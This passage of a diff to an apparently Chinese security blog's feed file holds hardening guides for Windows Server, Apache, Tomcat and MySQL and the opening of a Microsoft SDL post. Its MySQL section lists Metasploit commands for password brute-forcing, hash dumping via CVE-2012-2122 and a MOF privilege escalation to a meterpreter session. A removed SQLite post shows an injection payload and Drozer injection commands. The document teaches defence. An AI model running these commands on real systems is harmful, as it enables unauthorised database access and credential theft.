+<li>配置日志记录用户登录，包括登录账号、时间、登录IP地址、登录是否成功等。<br><code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核登录事件</code></li>
+<li>启用对windows系统的审核策略更改。<br><code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核策略更改</code></li>
+<li>启用对windows系统的审核对象访问。<br><code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核对象访问</code></li>
+<li>启用对windows系统的审核目录服务访问，仅需要审核失败操作。<br><code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核目录服务器访问</code></li>
+<li>启用对windows系统的审核特权使用。<br><code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核特权使用</code></li>
+<li>启用对windows系统的审核系统事件。<br><code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核系统事件</code></li>
+<li>启用对windows系统的审核账户管理。<br><code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核账户管理</code></li>
+<li>启用对windows系统的审核进程追踪，仅失败操作需要审核。<br><code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核系统追踪</code></li>
+<li>设置日志文件大小，根据磁盘空间大小尽可能记录更多日志，设置达到最大日志大小时按需要轮询记录日志。<br><code>控制面板&gt;管理工具&gt;事件查看器</code>，配置应用日志、系统日志、安全日志属性中日志大小，设置达到最大日志大小时的策略。</li>
+</ul>
+<ol start="3">
+<li>IP协议安全配置</li>
+</ol>
+<p>启用SYN攻击保护：</p>
+<ul>
+<li>指定触发SYN攻击保护必须超过的TCP连接请求数阈值为5。</li>
+<li>指定处于SYN_RCVD状态的TCP连接数阈值为500。</li>
+<li>指定处于至少已发送一次重传的SYN_RCVD状态中的TCP连接数阈值为400。</li>
+</ul>
+<p>操作步骤：<br>Windows Server 2008</p>
+<ul>
+<li><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SynAttackProtect</code><br>推荐值：2</li>
+<li><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcpMaxPortsExhausted</code><br>推荐值：5</li>
+<li><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcpMaxHalfOpen</code><br>推荐值：500</li>
+<li><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcpMaxHalfOpenRetried</code><br>推荐值：400</li>
+</ul>
+<p>Windows Server 2012</p>
+<ul>
+<li><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\SynAttackProtect</code><br>推荐值：2</li>
+<li><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\TcpMaxHalfOpen</code><br>推荐值：500</li>
+</ul>
+<ol start="4">
+<li>文件权限</li>
+</ol>
+<ul>
+<li>非域环境中关闭windows默认共享C$、D$<br>修改注册表<code>HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer</code> 推荐值：0<br>windows server 2012已默认关闭windows共享。</li>
+<li>共享文件夹的共享权限只允许已授权用户访问。</li>
+</ul>
+<ol start="5">
+<li>系统服务</li>
+</ol>
+<ul>
+<li>禁用TCP/IP上的NetBIOS协议，关闭UDP137、UDP138、TCP139等端口。<br><code>计算机管理&gt;服务和应用程序&gt;服务</code>禁用TCP/IP NetBIOS Helper服务。<br>再网络连接<code>属性&gt;Internet协议版本4(TCP/IPv4)&gt;高级&gt;WINS&gt;禁用TCP/IP上的NetBIOS</code></li>
+<li>禁用不必要的服务<br><img src="/images/services.PNG" alt></li>
+</ul>
+<ol start="6">
+<li>安全选项</li>
+</ol>
+<p>6.1 启用安全选项</p>
+<p>打开<code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;安全选项</code>，进行以下设置：<br><img src="/images/secure.PNG" alt></p>
+<p>6.2 禁用未登录前关机</p>
+<p>服务器该项是默认禁用的，如果启用会导致服务器安全性大大降低。<br>打开<code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;安全选项&gt;关机：允许系统再未登录前关机</code>项禁用。</p>
+<ol start="7">
+<li>其它安全设置</li>
+</ol>
+<ul>
+<li>安装企业级防病毒软件并保持病毒库更新。</li>
+<li>设置屏幕保护密码和开启时间。</li>
+<li>限制远程登录空闲断开时间。<br><code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;安全选项&gt;Microsoft网络服务器：暂停会话前所需的空闲时间数量</code>设置为15分钟</li>
+<li>补丁管理，保持操作系统补丁更新和兼容性测试，对生产服务器安装补丁要慎重。</li>
+</ul>
+<h3 id="Apache安全加固"><a href="#Apache安全加固" class="headerlink" title="Apache安全加固"></a>Apache安全加固</h3><ol>
+<li>账号策略</li>
+</ol>
+<p>1.1 以专门的用户账号和用户组运行Apache服务。</p>
+<ul>
+<li>为Apache服务创建Apache用户组。<br><code>groupadd apache</code></li>
+<li>创建Apache用户并加入Apache用户组。<br><code>useradd apache -g apache</code><br>-将以下参数加入Apache配置文件<code>httpd.conf</code>中。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User apache</span><br><span class="line">Group apache</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>1.2 检查httpd.conf配置文件中是否允许使用非专用帐号（如root）运行apache服务。默认设置一般服务要求，Linux中默认使用apache或nobody用户，Unix系统中默认使用daemon用户。</p>
+<ol start="2">
+<li>授权设置</li>
+</ol>
+<p>2.1 严格控制Apache主目录的访问权限，设置只允许root权限修改该目录中的内容。Apache的主目录对应于Apache Server配置文件httpd.conf中的Server Root控制项。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Server Root /usr/<span class="built_in">local</span>/apache</span><br></pre></td></tr></table></figure></p>
+<p>该目录一般设置为/etc/httpd，默认情况下属主为root用户，其他用户不能修改该目录中的文件。</p>
+<p>2.2 严格设置配置文件和日志文件的权限，防止未授权访问。</p>
+<ul>
+<li>执行命令<code>chmod 600 /etc/httpd/conf/httpd.conf</code>，设置配置文件为属主可读写，其他用户无访问权限。（默认权限644）</li>
+<li>执行命令<code>chmod 644 /var/log/httpd/*.log</code>，设置日志文件为属主可读写，其他用户只读权限。（默认权限644）</li>
+</ul>
+<ol start="3">
+<li>日志系统</li>
+</ol>
+<p>启用Apache日志系统，修改httpd.conf配置文件，设置日志记录文件、记录内容、记录格式等。</p>
+<ul>
+<li><p>错误日志</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LogLevel notice <span class="comment">#日志的级别</span></span><br><span class="line">ErrorLog /.../logs/error_log <span class="comment">#日志的保存位置</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>访问日志</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LogFormat %h %l %u %t \"%r\" %&gt;s %b <span class="string">"%&#123;Accept&#125;i\"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\""</span></span><br><span class="line">combined</span><br><span class="line">CustomLog /.../logs/access_log combined (访问日志)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><code>ErrorLog</code>指令设置错误日志文件名和位置，错误日志是最重要的日志文件，Apache httpd程序将在这个文件中存放诊断信息和处理请求中出现的错误，使用命令<code>ErrorLog syslog</code>将错误日志传送到Syslog。<br><code>CustomLog</code>指令指定保存日志文件的具体位置和日志格式，访问日志会记录服务器处理的所有请求。<br><code>LogFormat</code>命令用于设置日志格式，建议设置为combined格式。<br><code>LogLevel</code>命令用于调整记录在错误日志中的信息的详细程度，建议设置为notice。日志级别默认是warn级别，notice更详细但占用空间更大。</p>
+<ol start="4">
+<li>禁止访问外部文件</li>
+</ol>
+<p>禁止Apache访问Web目录外的文件。<br>4.1 修改配置文件httpd.conf。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Order Deny,Allow</span><br><span class="line">Deny from all</span><br></pre></td></tr></table></figure></p>
+<p>4.2 设置可访问的目录<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Order Allow,Deny</span><br><span class="line">Allow from /web</span><br></pre></td></tr></table></figure></p>
+<p>4.3 默认配置如下，可根据业务需要进行设置。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Options FollowSymLinks</span><br><span class="line">AllowOverride None</span><br></pre></td></tr></table></figure></p>
+<ol start="5">
+<li>禁止目录列出</li>
+</ol>
+<p>修改配置文件/etc/httpd/httpd.conf，删除Options的Indexes设置，重启Apache服务生效。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Options Indexes FollowSymLinks #删掉Indexes</span></span><br><span class="line">Options FollowSymLinks</span><br><span class="line">AllowOverride None</span><br><span class="line">Order allow,deny</span><br><span class="line">Allow from all</span><br></pre></td></tr></table></figure></p>
+<p>将<code>Options Indexes FollowSymLinks</code>中的<code>Indexes</code>去掉就可以禁止Apache显示该目录结构，Indexes的作用就是当该目录下没有index.html文件时，自动显示目录结构。</p>
+<ol start="6">
+<li>错误页面重定向</li>
+</ol>
+<p>Apache错误页面重定向功能可以防止敏感信息泄露。修改配置文件httpd.conf，添加错误重定向页面，重启Apache服务生效。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ErrorDocument 400 /custom400.html</span><br><span class="line">ErrorDocument 401 /custom401.html</span><br><span class="line">ErrorDocument 403 /custom403.html</span><br><span class="line">ErrorDocument 404 /custom404.html</span><br><span class="line">ErrorDocument 405 /custom405.html</span><br><span class="line">ErrorDocument 500 /custom500.html</span><br></pre></td></tr></table></figure></p>
+<ol start="7">
+<li>拒绝服务防护</li>
+</ol>
+<p>根据业务需要合理设置session时间，防止拒绝服务攻击。修改配置文件httpd.conf并重启Apache服务。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Timeout 10 <span class="comment">#客户端与服务器端建立连接前的时间间隔</span></span><br><span class="line">KeepAlive On</span><br><span class="line">KeepAliveTimeout 15 <span class="comment">#限制每个session的保持时间是15秒，根据具体需要进行设置。</span></span><br></pre></td></tr></table></figure></p>
+<ol start="8">
+<li>隐藏Apache版本号</li>
+</ol>
+<p>修改配置文件httpd.conf。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ServerSignature Off ServerTokens Prod</span><br></pre></td></tr></table></figure></p>
+<p>9.关闭TRACE功能</p>
+<p>关闭TRACE功能可防止TRACE方法被恶意利用。在配置文件httpd.conf中添加参数<code>TraceEnable Off</code>，该参数适用于Apache2.0以上版本。</p>
+<ol start="10">
+<li>禁用CGI</li>
+</ol>
+<p>如果服务器上不需要运行CGI程序，建议禁用CGI。如果没有CGI程序，可以修改配置文件httpd.conf，把cgi-bin目录的配置和模块全部注释掉。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#LoadModule cgi_module modules/mod_cgi.so</span></span><br><span class="line"><span class="comment">#ScriptAlias /cgi-bin/ “/var/www/cgi-bin/”</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#AllowOverride None</span></span><br><span class="line"><span class="comment"># Options None</span></span><br><span class="line"><span class="comment">#Order allow,deny</span></span><br><span class="line"><span class="comment">#Allow from all</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<ol start="11">
+<li>绑定监听地址</li>
+</ol>
+<p>服务器有多个IP地址时，只监听提供服务的IP地址。</p>
+<ul>
+<li><p>查看是否绑定IP地址。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/httpd/conf/httpd.conf | grep Listen</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改配置文件httpd.conf，设置监听地址<code>Listen IP:80</code></p>
+</li>
+</ul>
+<p>监听功能默认监听所有地址，如果服务器只有一个IP地址可以不用修改该项。</p>
+<ol start="12">
+<li>删除缺省安装的无用文件</li>
+</ol>
+<ul>
+<li><p>删除缺省HTML文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rm -rf /usr/local/apache2/htdocs/*</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除缺省CGI脚本：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rm -rf /usr/local/apache2/cgi-bin/*</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除Apache说明文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rm -rf /usr/local/apache2/manual</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除源代码文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rm -rf /path/to/httpd-2.2.4*</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除CGI，一般情况下<code>/var/www/html</code> <code>/var/www/cgi-bin</code>默认就是空的。</p>
+</li>
+</ul>
+<ol start="13">
+<li>禁用非法HTTP方法</li>
+</ol>
+<p>禁用PUT、DELETE等危险的HTTP方法，只允许get、post方法。修改配置文件httpd.conf。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Location /&gt;  </span><br><span class="line">&lt;LimitExcept GET POST CONNECT OPTIONS&gt; </span><br><span class="line">  Order Allow,Deny </span><br><span class="line">  Deny from all </span><br><span class="line">&lt;/LimitExcept&gt; </span><br><span class="line">&lt;/Location&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Tomcat安全加固"><a href="#Tomcat安全加固" class="headerlink" title="Tomcat安全加固"></a>Tomcat安全加固</h3><p>Tomcat服务默认启用了管理后台功能，使用该后台可直接上传war文件包对站点进行部署和管理，管理后台可能存在弱口令，可通过上传webshell获取web服务器权限。<br>Tomcat管理后台URL地址一般为<code>http://ip:8080/manager/html</code>。</p>
+<ol>
+<li>网络访问控制</li>
+</ol>
+<ul>
+<li>如果业务不需要使用Tomcat管理后台管理业务代码，建议使用防火墙功能对管理后台URL地址进行拦截，或直接将Tomcat部署目录中webapps文件夹中的manager、host-manager文件夹全部删除，并注释Tomcat目录conf文件夹中的tomcat-users.xml文件中的所有代码。</li>
+<li>如果业务系统需要使用Tomcat管理后台进行业务代码管理发布，建议为管理后台设置强密码，并修改默认用户名<code>admin</code>。</li>
+</ul>
+<ol start="2">
+<li>开启Tomcat访问日志</li>
+</ol>
+<p>修改conf/server.xml文件，将以下代码取消注释：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Valve className=<span class="string">"org.apache.catalina.valves.AccessLogValve"</span> directory=<span class="string">"logs"</span>   </span><br><span class="line">prefix=<span class="string">"localhost_access_log."</span> suffix=<span class="string">".txt"</span> pattern=<span class="string">"common"</span> resolveHosts=<span class="string">"false"</span>/&gt;</span><br></pre></td></tr></table></figure></p>
+<p>启用访问日志功能，重启Tomcat服务后，在tomcat_home/logs文件夹中就可以看到访问日志。</p>
+<ol start="3">
+<li>Tomcat默认账号安全</li>
+</ol>
+<p>修改Tomcat安装目录conf下的tomcat-user.xml文件，重新设置复杂口令，并重启Tomcat服务生效。</p>
+<ol start="4">
+<li>修改默认访问端口</li>
+</ol>
+<p>修改conf/server.xml文件，把默认8080端口修改为其他端口。</p>
+<ol start="5">
+<li>重定向错误页面</li>
+</ol>
+<p>修改访问Tomcat错误页面的返回信息，在webapps\manager目录中创建相应的401.htm、404.htm、500.htm文件，并在conf/web.xml文件最后一行前添加以下代码：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;error-page&gt;      </span><br><span class="line">                           &lt;error-code&gt;401&lt;/error-code&gt;              </span><br><span class="line">                           &lt;location&gt;/401.htm&lt;/location&gt;          </span><br><span class="line">                   &lt;/error-page&gt;          </span><br><span class="line">                   &lt;error-page&gt;    </span><br><span class="line">                           &lt;error-code&gt;404&lt;/error-code&gt;        </span><br><span class="line">                           &lt;location&gt;/404.htm&lt;/location&gt;          </span><br><span class="line">                   &lt;/error-page&gt;  </span><br><span class="line">                   &lt;error-page&gt;    </span><br><span class="line">                           &lt;error-code&gt;500&lt;/error-code&gt;  </span><br><span class="line">                           &lt;location&gt;/500.htm&lt;/location&gt;      </span><br><span class="line">                    &lt;/error-page&gt;</span><br></pre></td></tr></table></figure></p>
+<ol start="6">
+<li>禁止列出目录</li>
+</ol>
+<p>防止直接访问目录时，由于找不到默认页面而列出目录下文件的情况。在web.xml中将<code>&lt;param-name&gt;listings&lt;/param-name&gt;</code>改成<code>&lt;param-name&gt;false&lt;/param-name&gt;</code>。</p>
+<ol start="7">
+<li>删除文档和示例程序</li>
+</ol>
+<p>删除webapps目录下的docs、examples、manager、ROOT、host-manager文件夹。</p>
+<h3 id="MySQL安全加固"><a href="#MySQL安全加固" class="headerlink" title="MySQL安全加固"></a>MySQL安全加固</h3><h4 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><ol>
+<li>判断Mysql数据库版本</li>
+</ol>
+<p>使用nmap的指纹识别可以精确判断数据库版本号，metasploit提供的模块特点是能够判断数据库是否允许外链。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/mysql/mysql_version</span><br><span class="line">msf&gt; auxiliary(mysql_version)&gt; <span class="built_in">set</span> RHOSTS [IP]</span><br></pre></td></tr></table></figure></p>
+<p>如果数据库允许外链就能显示版本号，可以爆破密码。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/mysql/mysql_login</span><br><span class="line"><span class="built_in">set</span> USERNAME root</span><br><span class="line"><span class="built_in">set</span> PASS_FILE [密码字典]</span><br></pre></td></tr></table></figure></p>
+<p>枚举数据库信息<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf&gt; use auxiliary/admin/mysql/mysql_enum</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></p>
+<p>枚举的信息包括mysql版本号、操作系统架构、路径和密码hash等。</p>
+<ol start="2">
+<li>Mysql认证漏洞利用</li>
+</ol>
+<p>该漏洞编码为CVE-2012-2122，Mysql任意用户密码概率登录漏洞，按照公告说法大约256次就能蒙对一次。<br>MariaDB是为Mysql提供偶然替代功能的数据库服务器，Mysql是开源数据库。MariaDB 5.1.62、5.2.12、5.3.6、5.5.23之前版本和Mysql 5.1.63、5.5.24、5.6.6之前版本在用户验证的处理上存在安全漏洞，可能导致攻击者不需要正确密码就能登录到Mysql服务器。<br>用户连接到MariaDB/Mysql后，应用会计算和比较令牌值，由于错误的转换，即使memcmp()返回非零值，也可能出现错误的比较，造成MariaDB/Mysql误认为密码是正确的，因为协议使用的是随机字符串，该bug发生的机率为1/256.Mysql版本是否受影响取决于程序编译方式，很多版本并不受此漏洞影响。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf&gt; use auxiliary/admin/mysql/mysql_autobypass_hashdump</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOSTS [IP]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<ol start="3">
+<li>UDF提权</li>
+</ol>
+<p>Metasploit提供的exploit适用于5.5.9以下。利用Mof提权，该模块可以通过用户名和密码直接返回一个meterpreter会话。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf&gt; use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="built_in">set</span> rhost [IP]</span><br><span class="line"><span class="built_in">set</span> USERNAME root</span><br><span class="line"><span class="built_in">set</span> PASSWORD ***</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<h4 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h4><ol>
+<li>账号安全</li>
+</ol>
+<p>1.1 禁止Mysql以管理员权限运行</p>
+<p>修改配置文件/etc/my.cnf，禁止以管理员账号权限运行MYSQL服务。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[musql.server]</span><br><span class="line">user=mysql</span><br></pre></td></tr></table></figure></p>
+<p>1.2 避免不同用户间共享账号</p>
+<ul>
+<li>创建用户，执行以下命令将创建用户phplamp。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; mysql&gt; insert into mysql.user(Host,User,Password,ssl_cipher,x509_issuer,x509_subject) values(<span class="string">"localhost"</span>,<span class="string">"pppadmin"</span>,password(<span class="string">"passwd"</span>),<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用该用户登录MySQL。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">exit</span>;</span><br><span class="line">@&gt;mysql -u phplamp -p</span><br><span class="line">@&gt;********(密码)</span><br><span class="line">mysql&gt; 登录成功</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>1.3 删除无关账号</p>
+<p>使用<code>DROP USER</code>删除Mysql账号时，必须确保当前账户拥有Mysql数据库全局CREATE或DELETE权限，账号名称的用户和主机部分分别与用户表记录的User和Host列值对应。</p>
+<ol start="2">
+<li>密码策略</li>
+</ol>
+<p>使用以下命令修改账号密码，确保密码复杂度并定期修改。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; update user <span class="built_in">set</span> password=password(<span class="string">'passwd'</span>) <span class="built_in">where</span> user=<span class="string">'root'</span>;</span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure></p>
+<ol start="3">
+<li>授权设置</li>
+</ol>
+<p>在数据库权限配置能力范围内，根据业务要求配置最小权限设置。</p>
+<p>3.1 查看数据库授权情况：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; select * from user;</span><br><span class="line">mysql&gt; select * from db;</span><br><span class="line">mysql&gt; select * from host;</span><br><span class="line">mysql&gt; select * from tables_priv;</span><br><span class="line">mysql&gt; select * from columns_priv;</span><br></pre></td></tr></table></figure></p>
+<p>3.2 使用revoke命令回收不必要的授权。</p>
+<ol start="4">
+<li>开启日志审计功能</li>
+</ol>
+<p>Mysql日志类型有以下几种：</p>
+<ul>
+<li>错误日志：-log-err</li>
+<li>查询日志：-log（可选）</li>
+<li>慢查询日志：-log-slow-queries（可选）</li>
+<li>更新日志：-log-update<br>-二进制日志：-log-bin<br>在<code>my.ini</code>配置文件中增加上述需要的日志类型参数，重启Mysql服务即可启用日志功能。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Enter a name for the binary log. Otherwise a default name will be used. </span></span><br><span class="line"><span class="comment">#log-bin= </span></span><br><span class="line"><span class="comment">#Enter a name for the query log file. Otherwise a default name will be used. </span></span><br><span class="line"><span class="comment">#log= </span></span><br><span class="line"><span class="comment">#Enter a name for the error log file. Otherwise a default name will be used. </span></span><br><span class="line"><span class="built_in">log</span>-error= </span><br><span class="line"><span class="comment">#Enter a name for the update log file. Otherwise a default name will be used. </span></span><br><span class="line"><span class="comment">#log-update=</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>-执行命令<code>show variables like &#39;log_%&#39;;</code>可查看所有log。<br>-执行命令<code>show variables like &#39;log_bin&#39;;</code>可查看具体log。</p>
+<ol start="5">
+<li>补丁管理</li>
+</ol>
+<p>安装系统补丁前应进行兼容性测试，生产系统更新要慎重。</p>
+<ol start="6">
+<li>禁止数据库远程访问</li>
+</ol>
+<p>如果数据库不需要远程访问，应禁止远程TCP/IP连接，通过在Mysql服务器的启动参数中添加<code>--skip-networking</code>参数使Mysql服务器不监听任何TCP/IP连接，增加安全性。</p>
+<ol start="7">
+<li>设置可信IP访问控制</li>
+</ol>
+<p>通过数据库服务器的防火墙功能，限制特定IP通过监听器访问数据库。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON db.* TO 用户名@<span class="string">'IP子网/掩码'</span>；</span><br></pre></td></tr></table></figure></p>
+<ol start="8">
+<li>设置连接数</li>
+</ol>
+<p>在Mysql配置文件<code>my.conf</code>或<code>my.ini</code>的<code>[mysqld]</code>配置段中添加<code>max_connections = 1000</code>，保存配置文件并重启Mysql服务。</p>
+]]></content>
       <categories>
         <category>系统安全</category>
       </categories>
@@ -23,58 +713,338 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[深入理解SQLite]]></title>
-    <url>%2F2019%2F04%2F17%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQLite%2F</url>
-    <content type="text"><![CDATA[SQLite是一款开源数据库，Android选择SQLite的原因是其内存占用较低。 深入理解SQLiteSQLite数据库在Android中默认存储在/data/data/[package name]/databases/位置，文件扩展名为.db。 分析使用SQLite的简单应用 运行应用程序，使其创建SQLite数据库。 使用adb shell访问数据库，可以使用SQLite浏览器访问SQLite文件，也可以使用命令sqlite3进行管理。 SQLite数据库文件格式一般为.db，.sqlite，.sqlitedb或开发人员指定的其他扩展名。 使用命令sqlite3打开数据库，然后就可以使用sql命令对数据库进行操作，使用.help查看命令帮助。 1sqlite3 [dbname] .databases：列出数据库名称。.tables：列出数据库包含的表名称。.schema：查看表。 使用.output命令将SQL查询输出自动保存至指定文件，方便后续将文件拉取到本地，如果设置.output stdout，查询输出将在终端打印结果并保存至文件。.dump命令将创建一个列表，该列表包含从数据库创建到现在所执行的全部SQL操作。 另外，使用adb shell可以直接在本地对数据库进行操作。 1$ adb shell sqlite3 -column -header /data/data/[package_name]/databases/[db_name] 'select * from [table_name]' 安全漏洞跟WEB应用类似，Android应用程序中最常见的漏洞之一也是注入类漏洞。一般应用程序查询数据构造的SQL查询语句如下所示：123String getSQL = "SELECT * FROM " + tableName + "WHERE " + username + " = '" + uname + "' AND " + password + " = '" + pword + "'";Cursor cursor = dataBase.rawQuery(getSQL,null) 以上SQL查询用于验证用户登录凭证，然后显示其注册填写的信息，如果验证通过则返回布尔值TRUE。该SQL查询中uname和pword字段从用户输入直接传递到SQL语句，然后使用rawQuery方法执行，rawQuery方法会执行传递过来的任何SQL查询，类似的方法还有execSQL。 由于SQL查询未对用户端输入进行任何校验，如果用户端提交了不正常的输入，如密码框输入pword&#39; or &#39;1&#39;=&#39;1，从而使SQL查询结果始终为真，该用户将无需正确密码完成登录。同样的，SQLite可以使用--对后面部分进行注释。 1SELECT * FROM USER_RECORDS WHERE USERNAME = 'uname' AND PASSWORD = 'pword' or '1'='1' Drozer利用SQLite注入漏洞 启动Drozer连接SQLite数据库。 123adb forward tcp:31415 tcp:31415drozer console connect 在Drozer控制台使用finduri扫描器模块查看所有内容URI和可访问的URI。 1dz&gt; run scanner.provider.finduris -a [package_name] 3.使用Drozer中的注入扫描程序模块检查应用程序中的注入漏洞。 1dz&gt; run scanner.provider.injection -a [package_name] 使用参数查询这些内容供应器，如1 = 1将永远为TRUE。 1dz&gt; run app.provider.query [injection_uri] --selection "1=1" 还可以使用Drozer的app.provider.insert模块将数据插入数据库表。 1dz&gt; run app.provider.insert [injection_uri] --integer _id 1 --string column "string" 执行完成将输出Done.。]]></content>
+    <title>微软SDL（可信赖计算安全开发生命周期）</title>
+    <url>/2019/04/28/SDL%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h2 id="一、SDL简介"><a href="#一、SDL简介" class="headerlink" title="一、SDL简介"></a>一、SDL简介</h2><p>SDL（Security Development Lifecycle）可信赖计算安全开发生命周期，是微软提出的一套帮助开发人员构建更安全软件和解决安全合规要求的同时，降低开发成本的软件开发过程。SDL流程在软件开发流程的每个阶段加入一系列关注安全性的活动和交付结果，这些活动和交付结果包括在软件设计过程中开发威胁模型、在实施过程中使用静态分析代码扫描工具以及在集中进行的”安全推动”过程中进行代码审核和安全测试。</p>
+<h3 id="SDL基本流程"><a href="#SDL基本流程" class="headerlink" title="SDL基本流程"></a>SDL基本流程</h3><p>Microsoft标准软件开发流程如下图所示，也是行业内的典型流程。该开发流程实际上是螺旋形的，在实施阶段可能需要经常重新考虑需求和设计问题。</p>
+<p><img src="/images/SDL.gif" alt></p>
+<p>实际实施中软件安全性方面的经验已经为构建更安全的软件建立了一套高标准的原则，Microsoft将这些原则称作SD3+C，即设计安全、默认安全、部署安全和通信。</p>
+<ul>
+<li>设计安全：在架构、设计和实现软件时，应该在运行时能保护自身及其处理的信息，并能抵御攻击。</li>
+<li>默认安全：实际实施中软件无法实现绝对的安全，为了使攻击者对软件缺陷发起攻击时造成的损失最小，软件在默认状态下应具有更高的安全性。如，软件应该在最低的必要权限下运行，非广泛需要的服务和功能在默认情况下应被禁用或仅可由特定用户访问。</li>
+<li>部署安全：软件应随附工具和指导以帮助最终用户和管理员安全地使用，且更新应易于部署。</li>
+<li>通信：软件开发者应及时明确地接收发现的产品漏洞，并负责提出处理措施。</li>
+</ul>
+<p>SD3+C每个要素都对开发流程提出了要求，但设计安全和默认安全对软件安全性提升作用最大，设计安全改进流程以防止在第一阶段引入漏洞，默认安全则要求软件默认状态下暴露的攻击面最小。</p>
+<p>在现有开发流程中引入继承SD3+C方法的安全措施后的改进流程结构如下图所示。</p>
+<p><img src="/images/sdl_02.gif" alt></p>
+<h2 id="二、安全设计核心原则"><a href="#二、安全设计核心原则" class="headerlink" title="二、安全设计核心原则"></a>二、安全设计核心原则</h2><p>SDL安全设计核心原则：</p>
+<ul>
+<li>Attack Surface Reduction：攻击面最小化</li>
+<li>Basic Privacy：基本隐私</li>
+<li>Least Privilege：权限最小化</li>
+<li>Secure Defaults：默认安全</li>
+<li>Defense in Depth：纵深防御</li>
+<li>Threat Modeling：威胁建模</li>
+</ul>
